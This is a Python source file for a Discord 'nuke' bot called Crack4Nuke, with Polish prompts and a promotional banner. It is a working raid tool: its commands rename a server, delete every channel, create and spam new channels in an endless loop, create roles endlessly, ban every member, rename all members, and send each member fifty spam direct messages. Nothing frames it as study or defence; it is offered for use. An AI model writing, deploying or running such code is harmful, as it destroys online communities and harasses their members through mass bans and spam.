import random
from anyio import sleep
import discord
from discord.ext import commands
import colorama
from colorama import Fore
from colorama import Style
import os
import ctypes

client = commands.Bot(command_prefix='.', intents=discord.Intents.all())
client.remove_command('help')

@client.event
async def on_ready():
    print(f"Logged in as {client.user}")

os.system("cls")

version = '2.0'

ctypes.windll.kernel32.SetConsoleTitleW(f"Crack4Nuke  wersja:{version}")

name_channels = input(f"{Fore.GREEN}[+]{Style.RESET_ALL} Nazwa kanalu ")
how_much_channels = int(input(f"{Fore.GREEN}[+]{Style.RESET_ALL} ile kanalow stworzyc?: "))
server_name = input(f"{Fore.GREEN}[+]{Style.RESET_ALL} Nazwa serwera: ")
spam_message = input(f"{Fore.GREEN}[+]{Style.RESET_ALL} Czym bot ma spamic: ")
token_bot = input(f"{Fore.GREEN}[+]{Style.RESET_ALL} Bot token: ")
spam_pv = input(f"{Fore.GREEN}[+]{Style.RESET_ALL} Czym bot maa spamic na pv: ")
nowa_nazwa = input(f"{Fore.GREEN}[+]{Style.RESET_ALL} Jaka nowa nazwa dla pseudonimów: ")


@client.command()
async def nuke(ctx):
    guild = ctx.guild
    await ctx.guild.edit(name=server_name)
    try:
        for channels in ctx.guild.channels:
            await channels.delete()
    except:
        pass

    for i in range(how_much_channels):
        new_channel = await guild.create_text_channel(name_channels)

    while True:
        for channel in guild.text_channels:
            await channel.send(spam_message)

@client.command()
async def spamroles(ctx, role_name):
    guild = ctx.guild
    author = ctx.message.author
    await author.send(f"The {role_name} roles has been created")
    while True:
        await guild.create_role(name=role_name)

@client.command()
async def nick(ctx):
    if ctx.guild is not None:
        try:
            for member in ctx.guild.members:
                await member.edit(nick=nowa_nazwa)
            await ctx.send(f"Zmieniono pseudonimy wszystkich użytkowników na: {nowa_nazwa}")
        except discord.Forbidden:
            await ctx.send("Nie mam uprawnień do zmiany pseudonimów.")
        except discord.HTTPException:
            await ctx.send("Wystąpił błąd podczas zmiany pseudonimów.")


@client.command()
async def banpop(ctx):
    for member in ctx.guild.members:
        await member.ban(reason="Masowy ban")
    await ctx.send("Wszystkie osoby zostały zbanowane.")




@client.command()
async def spampv(ctx):
    if ctx.guild is not None:
        message = (spam_pv)  
        for member in ctx.guild.members:
            if member != client.user:
                try:
                    for _ in range(50):  
                        await member.send(spam_pv)
                except discord.Forbidden:
                    print(f"Nie mogłem wysłać wiadomości do {member.name}")
                except discord.HTTPException:
                    print(f"Wystąpił błąd podczas wysyłania wiadomości do {member.name}")

@client.event
async def on_message(message):
    await client.process_commands(message)




os.system("cls")

print(f"""{Fore.MAGENTA}
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════    
  {Fore.LIGHTMAGENTA_EX}             {Fore.MAGENTA}                                
  {Fore.LIGHTMAGENTA_EX}[v{version}]{Fore.MAGENTA}    
  _____ ______  ___  _____ ______ _   __  ___  _   _ _   _ _   __ _____ 
/  __ \| ___ \/ _ \/  __ \| ___ \ | / / /   || \ | | | | | | / /|  ___|
| /  \/| |_/ / /_\ \ /  \/| |_/ / |/ / / /| ||  \| | | | | |/ / | |__  
| |    |    /|  _  | |    |    /|    \/ /_| || .  | | | |    \ |  __| 
| \__/\| |\ \| | | | \__/\| |\ \| |\  \___  || |\  | |_| | |\  \| |___ 
 \____/\_| \_\_| |_/\____/\_| \_\_| \_/   |_/\_| \_/\___/\_| \_/\____/ 
                                                                       
                                                                       

            
  {Fore.GREEN}https://discord.gg/emebHjvm{Fore.RED}           
  {Fore.YELLOW}dc _matis connect to bot{Fore.MAGENTA}                      
  {Fore.LIGHTMAGENTA_EX}                {Fore.BLUE}                 

════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{Style.RESET_ALL} """)

print("Komendy")
print(f"\n{Fore.LIGHTMAGENTA_EX}[{Style.RESET_ALL}1{Fore.LIGHTMAGENTA_EX}]{Style.RESET_ALL} .nuke")
print(f"{Fore.LIGHTMAGENTA_EX}[{Style.RESET_ALL}2{Fore.LIGHTMAGENTA_EX}]{Style.RESET_ALL} .spamroles [nazwa]")
print(f"{Fore.LIGHTMAGENTA_EX}[{Style.RESET_ALL}2{Fore.LIGHTMAGENTA_EX}]{Style.RESET_ALL} .spampv [wiadomosc]")
print(f"{Fore.LIGHTMAGENTA_EX}[{Style.RESET_ALL}2{Fore.LIGHTMAGENTA_EX}]{Style.RESET_ALL} .nick")
print(f"\n{Fore.YELLOW}prefix: .{Style.RESET_ALL}")
print("    ")

client.run(token_bot)